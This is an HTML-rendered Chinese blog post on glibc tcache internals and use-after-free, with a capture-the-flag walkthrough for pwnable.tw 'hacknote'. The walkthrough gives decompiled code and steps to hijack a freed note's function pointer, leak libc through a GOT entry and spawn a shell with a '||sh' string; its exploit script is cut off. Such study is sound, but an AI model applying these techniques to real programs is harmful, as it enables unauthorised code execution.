或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul><h2 id="各个函数中关于tcache的部分"><a href="#各个函数中关于tcache的部分" class="headerlink" title="各个函数中关于tcache的部分"></a>各个函数中关于tcache的部分</h2><h3 id="–libc-malloc-1"><a href="#–libc-malloc-1" class="headerlink" title="–libc-malloc  "></a><a href="#__libc_malloc">–libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// 初始化 tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//如果为空就执行初始化函数</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// 根据 size 得到的 idx 在合法的范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] 有 chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// 找到可用的 arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//这是.....不成功再来一遍?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//注释说如果取不到的话就等会再试, 通常在内存空间小的情况下</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// 初始化 tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></div></td></tr></table></figure><h3 id="申请内存-2-27"><a href="#申请内存-2-27" class="headerlink" title="申请内存 2.27"></a>申请内存 <u>2.27</u></h3><p>接下来将进入申请内存的步骤</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">// 从 tcache list 中获取内存</span><br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 由 size 计算的 idx 在合法范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// 该条 tcache 链不为空</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-comment">// 进入与无 tcache 时的流程</span><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</li></ul><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>看一下 <code>tcache_get()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// 获得一个 chunk，counts 减一</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</li></ul><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>看完申请，再看看有 tcache 时的释放</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</li></ul><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>跟进 <code>_int_free()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></div></td></tr></table></figure><ul><li>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</li></ul><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</li></ul><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p><h2 id="例子-–-pwnable-tw-hacknote"><a href="#例子-–-pwnable-tw-hacknote" class="headerlink" title="例子 – pwnable.tw_hacknote"></a>例子 – pwnable.tw_hacknote</h2><p>题目在 <a href="../../files/hacknote.zip">这里</a> 下载</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> root @ Kiprey <span class="hljs-keyword">in</span> ~/Desktop/Pwn [14:16:43]</span><br><span class="hljs-meta">$</span><span class="bash"> checksec hacknote</span>  <br>[*] &#x27;/root/Desktop/Pwn/hacknote&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></div></td></tr></table></figure><h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )  <span class="hljs-comment">//最多放五个chunk</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) ) <span class="hljs-comment">//如果该位置为空, 猜测应该是一个数组, 元素是指向chunk的指针</span><br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>); <span class="hljs-comment">//malloc了八字节</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = sub_804862B; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-keyword">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-comment">//这里可以知道数组元素指向一个结构体, 这个结构体有两个指针</span><br>          <span class="hljs-comment">//第一个是函数sub_804862B的指针, 第二个是content指针,malloc出来的</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub_80487D4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<span class="hljs-comment">//先freecontent</span><br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));<span class="hljs-comment">//再free chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>); <span class="hljs-comment">//并未设置NULL</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    <span class="hljs-comment">//&amp;ptr + v1是函数指针的地址,解引用后得到改地址上的函数指针, 前面的是函数头</span><br>    <span class="hljs-comment">//就是调用存在改地址的put函数</span><br>    (*(<span class="hljs-keyword">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1)) (*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p class="note note-info"><strong>UAF--use after free</strong>, 要在free后再次使用一般是在free后指针并未设置为NULL. 这是UAF一个很明显的标志</p> </li><li><p>这里的delete函数中就没有在free后面设置NULL, 我们可以利用fastbin链的特性，来使一个可修改的指针指向某个被释放的note的func成员指针，进而修改该指针并执行其指向的函数</p></li><li><p>过程分析:</p><ol><li>我们可以先声明两个note，分别称为note0、note1，注意这两个note的content size必须&gt;12， 这样content chunk<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="与上条类似，我们同样将分配作为content的chunk称为content chunk">[1]</span></a></sup>的大小就会 <strong>大于</strong> note chunk<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="为了方便，我们将分配作为note的chunk称为note chunk">[2]</span></a></sup>的大小 . <u>此时note chunk的user size为(8+4)bytes, content chunk的user size为(申请的大小+4)</u> </li></ol><div class="hljs code-wrapper"><pre><code>如此，当这两个note都被释放时，两个note的note chunk会放置进相同索引的fast bin链里，而另外两个content chunk则会放置进 **另一个索引** 的fast bin链里。 note chunk 和 content chunk 在fast bin链中互不干扰</code></pre></div><ol start="2"><li>q第二步就是新建一个新的note2，注意该note的content size要&lt;=12分配到<strong>fastbin上note1</strong>的空间，成为note2的content chunk</li><li><strong>注意</strong>：当程序可以执行system函数时，注意传入的地址为note2的地址，所以<code>[system addr]</code> 以及其后4个字节都会被解释成字符串尝试执行。但[system addr]又必须保留，那该如何get shell呢？<br> 这里有个小技巧，我们可以在最后四个字节构造<code>&quot;||sh&quot;</code>。这样便会执行<code>system(&quot;[system addr]||sh&quot;)</code><br> 由于<code>[system addr]</code>肯定执行失败，所以便会执行到后面的<code>sh</code>。这样便可以get shell</li></ol></li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><p>新建note0、note1，其note size必须大于12</p></li><li><p>释放note0、note1</p></li><li><p>新建note2，其note size必须&lt;=12。</p><p>此时note2-&gt;content指针就会指向note1，在新建的过程中，便可修改内存上的内存。</p><ul><li>修改note1-&gt;func为puts()函数（func指针默认设置的函数)</li><li>修改note1-&gt;content为<code>got@__libc_start_main</code>（随便哪个已经延迟绑定过的函数都行）</li></ul></li><li><p>输出note1的内容（print note1），从而泄露libc基地址，进而确定<code>system</code>函数的地址</p></li><li><p>释放note2并重新建立note2，其note size仍然必须&lt;=12</p><p>在建立note2过程中，修改以下内容</p><ul><li>修改note1-&gt;func为<code>system</code>函数</li><li>修改note1-&gt;content为<code>&quot;||sh&quot;</code>字符串</li></ul></li><li><p>输出note1的内容（print note1） 执行system(“sh”)， get shell！</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 